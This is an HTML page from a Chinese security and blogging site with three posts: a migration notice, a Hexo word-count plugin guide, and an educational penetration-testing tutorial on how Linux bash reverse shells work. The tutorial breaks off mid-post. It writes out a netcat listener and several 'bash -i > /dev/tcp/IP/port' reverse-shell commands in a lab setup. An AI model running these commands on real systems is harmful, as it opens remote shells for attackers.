<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="深度学习 网络安全">
<meta property="og:type" content="website">
<meta property="og:title" content="国家二级薯条试吃员">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="国家二级薯条试吃员">
<meta property="og:description" content="深度学习 网络安全">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="国家二级薯条试吃员">
<meta name="twitter:description" content="深度学习 网络安全">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>国家二级薯条试吃员</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?179528a02a5e4886fc76ce4097e5c486";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">国家二级薯条试吃员</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">没有我不敢收的红包</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      

      
    </ul>
  

  
</nav>
<script>
    
    window.onload = function(){
        var path = 'https://malizhi.cn'; //这里要改成你博客的地址
        var localhostItem = String(window.location).split(path)[1];
        var LiNode = document.querySelectorAll('#menu > li > a')
        
        for(var i = 0; i< LiNode.length;i++){
            var item = String(LiNode[i].href).split(path)[1];
            if(item == localhostItem && item != undefined){
                LiNode[i].setAttribute('style','border-bottom:1px solid black');
            }
        }
    };

</script>


 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/博客转移公告/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/23/博客转移公告/" itemprop="url">博客转移公告</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-23T22:15:08+08:00">
                2019-10-23
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/公告/" itemprop="url" rel="index">
                    <span itemprop="name">公告</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/23/博客转移公告/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/23/博客转移公告/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  134字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Hexo坑太多了，我想弃坑，我先研究一下WP好不好使</p>
<p>备注： 不蒜子页面PV统计插件，因为七牛云到期，人家耍赖不给他续域名，导致JS文件地址更换没更换为：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script <span class="keyword">async</span> src=<span class="string">"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;span id=<span class="string">"busuanzi_container_site_pv"</span>&gt;本站总访问量&lt;span id=<span class="string">"busuanzi_value_site_pv"</span>&gt;&lt;/span&gt;次&lt;<span class="regexp">/span&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>百度统计会少统计一些IP</p>
<p>Hexo字数统计这篇已经很详细了：<a href="https://www.jianshu.com/p/baea8c95e39b" target="_blank" rel="noopener">https://www.jianshu.com/p/baea8c95e39b</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/Hexo添加字数统计、阅读时长/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/23/Hexo添加字数统计、阅读时长/" itemprop="url">Hexo添加字数统计、阅读时长</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-23T20:15:08+08:00">
                2019-10-23
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Hexo静态博客踩坑/" itemprop="url" rel="index">
                    <span itemprop="name">Hexo静态博客踩坑</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/23/Hexo添加字数统计、阅读时长/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/23/Hexo添加字数统计、阅读时长/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  408字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="统计插件"><a href="#统计插件" class="headerlink" title="统计插件"></a>统计插件</h3><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>NexT 主题默认已经集成了文章【字数统计】、【阅读时长】统计功能，如果我们需要使用，只需要在主题配置文件 _config.yml 中打开 wordcount 统计功能即可。如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/willin/hexo-wordcount</span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: <span class="keyword">true</span></span><br><span class="line">  wordcount: true         # 单篇 字数统计</span><br><span class="line">  min2read: true          # 单篇 阅读时长</span><br><span class="line">  totalcount: false       # 网站 字数统计</span><br><span class="line">  separated_meta: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>
<p>修改完成主题配置文件后，启动服务预览：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
<p>访问 <a href="https://link.jianshu.com?t=http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 链接，如果出现字数统计和阅读时长失效的情况，一般是因为没有安装 hexo-wordcount 插件，查看 Hexo 插件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo --debug</span><br></pre></td></tr></table></figure>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>如果没有安装 hexo-wordcount 插件，先安装该插件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure>
<p><strong><em> Node 版本 7.6.0 之前,请安装 2.x 版本 (Node.js v7.6.0 and previous) ，安装命令如下：</em></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount@2 --save</span><br></pre></td></tr></table></figure>
<p>安装完成后，重新执行启动服务预览就可以了。</p>
<h4 id="显示文字"><a href="#显示文字" class="headerlink" title="显示文字"></a>显示文字</h4><p>用 Sublime Text 工具打开 post.swig 文件，路径如下：xxx_blog/themes/next/layout/_macro/post.swig</p>
<p>修改【字数统计】，找到如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;span title=<span class="string">"&#123;&#123; __('post.wordcount') &#125;&#125;"</span>&gt;</span><br><span class="line">    &#123;&#123; wordcount(post.content) &#125;&#125;</span><br><span class="line">&lt;<span class="regexp">/span&gt;</span></span><br></pre></td></tr></table></figure>
<p>添加 “字” 到  wordcount(post.content)  后面，修改后为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;span title=<span class="string">"&#123;&#123; __('post.wordcount') &#125;&#125;"</span>&gt;</span><br><span class="line">    &#123;&#123; wordcount(post.content) &#125;&#125; 字</span><br><span class="line">&lt;<span class="regexp">/span&gt;</span></span><br></pre></td></tr></table></figure>
<p>同理，我们修改【阅读时长】，修改后如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;span title=<span class="string">"&#123;&#123; __('post.min2read') &#125;&#125;"</span>&gt;</span><br><span class="line">    &#123;&#123; min2read(post.content) &#125;&#125; 分钟</span><br><span class="line">&lt;<span class="regexp">/span&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改完成后，重新执行启动服务预览就可以了。修改后，效果如下图所示：<br><img src="https://upload-images.jianshu.io/upload_images/4463968-37c9061110bd444a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/Linux 反弹shell（二）反弹shell的本质/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/23/Linux 反弹shell（二）反弹shell的本质/" itemprop="url">Linux 反弹shell（二）反弹shell的本质</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-23T20:15:08+08:00">
                2019-10-23
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/23/Linux 反弹shell（二）反弹shell的本质/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/23/Linux 反弹shell（二）反弹shell的本质/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.5k字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  9分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>在上一篇文章 <a href="http://googol.ai/2019/10/23/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/" title="Linux反弹shell（一）文件描述符与重定向" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a>，我们已经讨论过了反弹shell中最核心也是相对较难理解的部分，那么接下来我们就可以正式借反弹shell的实例分析回顾前一篇文章讲的知识，并且也加深对反弹shell的理解吧。</p>
<h2 id="0X01-什么是反弹shell"><a href="#0X01-什么是反弹shell" class="headerlink" title="0X01 什么是反弹shell"></a><strong>0X01 什么是反弹shell</strong></h2><p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<h2 id="0X02-为什么要反弹shell"><a href="#0X02-为什么要反弹shell" class="headerlink" title="0X02 为什么要反弹shell"></a><strong>0X02 为什么要反弹shell</strong></h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p>
<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
<p>2.它的ip会动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<h2 id="0X03-反弹shell的本质是什么"><a href="#0X03-反弹shell的本质是什么" class="headerlink" title="0X03 反弹shell的本质是什么"></a><strong>0X03 反弹shell的本质是什么</strong></h2><p>我们可以先以一个linux 下的反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，<font color="#dd0000">掌握了反弹的本质，再多的方法其实只是换了包装而已。</font><br> </p>
<p><strong>实验环境：</strong></p>
<p><strong>受害者：</strong></p>
<p>Ubuntu Linux ——&gt; 192.168.146.128</p>
<p><strong>攻击者：</strong></p>
<p>Kali Linux ——&gt; 192.168.146.129</p>
<p>我们就以最常见的bash为例：<br>attacker机器上执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
<p>victim 机器上执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>你就会看到下图：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173607-cef38600-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-f85a4437eff0e29c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>可以看到在攻击机上出现了受害者机器的shell</p>
<p>解释一下这条命令具体的含义：</p>
<p><strong>1.bash -i</strong></p>
<p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
<p>2）-i 这个参数表示的是产生交互式的shell</p>
<p><strong>2./dev/tcp/ip/port</strong></p>
<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，如下图：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173607-cf021f9e-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-74ac2f3665451041.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
<p><strong>实例1：</strong></p>
<p>我们输出字符串到这个文件里</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173607-cf0c2d36-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-aaa0406590121908.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>攻击机上的输出</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173607-cf17f062-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-7461772dcdbea9f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><strong>实例2：</strong></p>
<p>攻击机上的输入</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173607-cf26ad46-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-3bd23b9eec7b4a9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>受害者机器上的输出</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cf3172ee-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-701c686765e230f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><strong>3.交互重定向</strong></p>
<p><strong>注意：</strong><br>下面的内容涉及到比较复杂的重定向和文件描述符的知识，如果理解不够深入建议看完我的上一篇文章以后再来继续阅读：</p>
<p><strong>文章链接：</strong><br><a href="https://xz.aliyun.com/t/2548" title="Linux反弹shell（一）文件描述符与重定向" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a></p>
<p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上<br>在受害者机器上输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>
<p>示意图：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cf42bf0e-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-741aec250ea9b8a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>如下图所示，任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cf500092-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-340d6aeafc3cea43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cf5c2610-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-70b5b3bc9511479c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p>
<p>于是我们似乎还需要一条这样的指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>
<p>示意图：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cf6dc0aa-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-2c8600a2f4effd48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>这条指令的意思是将攻击者输入的命令输入给受害者的bash，自然就能执行了</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cf7850f6-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-2080ed242b3c0bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cf863ae0-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-edda7158bc27f836.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>现在我们需要将两条指令结合起来（如果这条指令看不懂可以去看一下我上面提供的文章的链接再回来看这条指令）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>示意图：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cf98d0ec-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-5047997a9e0bc5f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><strong>由这张示意图可以很清楚地看到，输入0是由/dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.156.129/2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong></p>
<p>如下图所示，我在攻击机上输入 ifconfig，查看到的是受害者的ip ，也就是说我们目前已经基本完成了一个反弹shell 的功能。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cfb2189a-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-bb899d5c8312d011.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><strong>注意：</strong><br>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173608-cfbf9362-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-840f5b3ee5ff940b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><strong>4. &gt;&amp;、&amp;&gt;</strong></p>
<p>这个符号在我附上链接的那篇文章中也提到了，作用就是混合输出（错误、正确输出都输出到一个地方）</p>
<p>现在我们解决一下前面的问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173609-cfe54a1c-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-d79a5c8eae11f9f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>可以看到命令并没有回显在受害者机器上，我们的目的达成了</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173609-cff2d39e-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-4d8ebf6859dfdfff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>当然我们也可以执行与之完全等价的指令</p>
